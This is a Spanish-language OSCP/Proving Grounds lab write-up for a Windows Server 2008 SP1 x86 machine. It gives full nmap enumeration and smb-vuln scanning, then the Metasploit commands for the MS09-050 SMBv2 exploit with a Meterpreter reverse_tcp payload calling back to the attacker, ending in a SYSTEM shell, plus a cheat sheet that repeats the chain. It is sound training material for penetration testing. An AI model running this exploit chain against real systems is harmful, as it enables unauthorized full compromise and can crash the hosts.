# Máquina "Internal" (Windows Server 2008 SP1) — Writeup (OSCP / PG)

**Objetivo:** 192.168.241.40 — Windows Server 2008 Standard SP1 (x86), host `INTERNAL`, **workgroup** WORKGROUP (no es dominio)
**Atacante (Kali):** tun0 = 192.168.45.166

Resumen de la cadena:
**Enumeración SMB → identificar versión exacta (2008 SP1 x86) → detectar la vuln con scripts de nmap (CVE-2009-3103 / MS09-050) → exploit SMBv2 con Metasploit → shell SYSTEM.**

> Es una máquina "directa": una única vulnerabilidad de servicio da SYSTEM, sin escalada posterior. Lo valioso aquí es **el método para identificar el exploit correcto**.

---

## 1. Reconocimiento

```bash
# Puertos
sudo nmap -p- --min-rate=5000 -T4 -Pn 192.168.241.40
# Versiones + scripts por defecto sobre los abiertos
sudo nmap -p53,135,139,445,3389,5357,49152-49158 -sCV -T4 -Pn 192.168.241.40
```

Lo importante del `-sCV` (de aquí sale TODO lo que decide el ataque):
```
445/tcp open microsoft-ds Windows Server (R) 2008 Standard 6001 Service Pack 1
| smb-os-discovery:
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)
| rdp-ntlm-info:
|   NetBIOS_Computer_Name: INTERNAL
|   Workgroup: WORKGROUP
```

Datos que deciden el exploit:
- **Server 2008 Standard SP1** (build 6001) → superficie de SMB antiguo.
- **x86 (32-bit)** → se confirma más abajo; descarta exploits que solo van en x64.
- **SMBv2 activo, signing disabled** → vector SMB.
- **Workgroup** (no dominio) → el camino es una vuln de servicio, no Active Directory.

---

## 2. La parte clave: ¿cómo se identifica el exploit correcto?

La cadena mental: **versión exacta → enumerar vulnerabilidades conocidas de esa versión → confirmarlas → elegir módulo.** No se adivina.

### 2.1 Scripts de vulnerabilidad de nmap (el paso que lo resuelve)

En vez de intuir, nmap prueba de golpe los CVE famosos de SMB:
```bash
nmap -p139,445 --script "smb-vuln*" 192.168.241.40
```
Esto marca directamente qué aplica, por ejemplo:
```
smb-vuln-cve2009-3103: VULNERABLE   -> MS09-050 (SMBv2)
smb-vuln-ms17-010:    (según parche)
smb-vuln-ms08-067:    (según parche)
```
**Con esto NO necesitas el briefing:** nmap te enumera los CVE y eliges.

### 2.2 searchsploit / búsqueda del CVE
```bash
searchsploit windows server 2008 smb
searchsploit cve-2009-3103
searchsploit ms09-050
```
En Metasploit:
```
search cve:2009-3103
search ms09-050
```
→ módulo: `exploit/windows/smb/ms09_050_smb2_negotiate_func_index`.

### 2.3 Tabla de "grandes éxitos" de SMB en Windows viejo (útil memorizar)

| CVE | Boletín MS | Afecta | Nota |
|-----|-----------|--------|------|
| CVE-2008-4250 | MS08-067 | 2000/XP/2003/2008 | NetAPI, el clásico |
| **CVE-2009-3103** | **MS09-050** | **Vista / 2008 SMBv2** | negociación SMB2, **este lab** |
| CVE-2017-0144 | MS17-010 (EternalBlue) | 2008R2/7/2012/2016 | el módulo eternalblue es **x64 only** |

> Lección honesta: el sospechoso #1 de un 2008 con SMB es MS17-010, y aquí el scan lo daba "likely vulnerable". Pero al ser **x86** el módulo eternalblue aborta (`only supports x64`), y el `ms17_010_psexec` falló por named pipe. El briefing confirmó **CVE-2009-3103**, pero el camino reproducible sin briefing es el `--script "smb-vuln*"` del punto 2.1.

---

## 3. Explotación: MS09-050 (SMBv2)

```
msfconsole -q
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS 192.168.241.40
set LHOST tun0
set LPORT 4444
set payload windows/meterpreter/reverse_tcp
run
```

Resultado: sesión Meterpreter como **nt authority\system**.
```
getuid        # NT AUTHORITY\SYSTEM
shell
whoami
type C:\Users\Administrator\Desktop\proof.txt
```

**Aviso:** MS09-050 es corrupción de memoria en kernel. Si falla puede dejar la máquina en BSOD (`Exploit completed, but no session was created` o deja de responder). En ese caso: **revert** en el portal y reintentar con la máquina recién arrancada.

---

## 4. Intentos que NO eran el camino (y por qué)

| Intento | Por qué falló |
|---------|---------------|
| `ms17_010_eternalblue` | `This module only supports x64` — el target es **x86**. |
| `ms17_010_psexec` | `Unable to find accessible named pipe!` — sin credenciales/pipe anónimo accesible. |
| `ms09_050_...` | ✅ El correcto (lo indicaba CVE-2009-3103). |

Esto enseña algo importante: **"vulnerable a X" en un scanner no garantiza que el exploit de X funcione** (arquitectura, parches parciales, requisitos de pipe). Hay que tener plan B y leer los errores.

---

## 5. Chuleta rápida

```bash
# 1. Fingerprint
sudo nmap -p- --min-rate=5000 -Pn <IP>
sudo nmap -p<abiertos> -sCV -Pn <IP>        # version exacta + SP + arquitectura

# 2. Enumerar vulns SMB (el paso decisivo)
nmap -p139,445 --script "smb-vuln*" <IP>

# 3. Buscar el CVE -> modulo
searchsploit cve-2009-3103 ; search cve:2009-3103   (en msf)

# 4. Explotar
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS <IP>; set LHOST tun0; set LPORT 4444
set payload windows/meterpreter/reverse_tcp
run
```

---

## 6. Lecciones clave

1. **No te quedes en "es un Windows 2008".** El *Service Pack*, el *build* y la **arquitectura (x86/x64)** deciden qué exploit sirve. Todo eso está en `nmap -sCV` + `smb-os-discovery`.
2. **`nmap --script "smb-vuln*"` es tu mejor amigo** en máquinas viejas: enumera los CVE conocidos sin que tengas que adivinar.
3. **Mapea CVE ↔ boletín MS ↔ módulo** (MS08-067, MS09-050, MS17-010). Es pattern-matching que se memoriza con la práctica.
4. **"Vulnerable" ≠ "explotable a la primera":** la arquitectura y los requisitos del módulo (named pipe, x64) pueden tumbar el intento. Lee los errores y ten plan B.
5. **Workgroup vs dominio:** si no hay Kerberos/LDAP (88/389), olvida ataques de AD y céntrate en vulns de servicio.
6. **Exploits de kernel = frágiles.** Si tumban la máquina, revert y reintento, sin dramatizar.
